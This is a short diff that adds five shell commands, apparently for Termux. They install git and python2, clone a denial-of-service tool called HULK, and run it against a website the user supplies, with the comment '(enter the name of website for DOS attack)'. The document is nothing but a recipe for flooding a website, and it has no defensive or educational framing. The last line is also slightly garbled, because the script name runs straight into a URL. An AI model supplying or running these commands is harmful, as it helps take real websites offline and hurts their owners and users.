@@ -1,0 +1,5 @@
+pkg install git
+apt install python2
+git clone https://github.com/grafov/hulk
+cd hulk
+python2 hulk.pyhttps://  (enter the name of website for DOS attack)
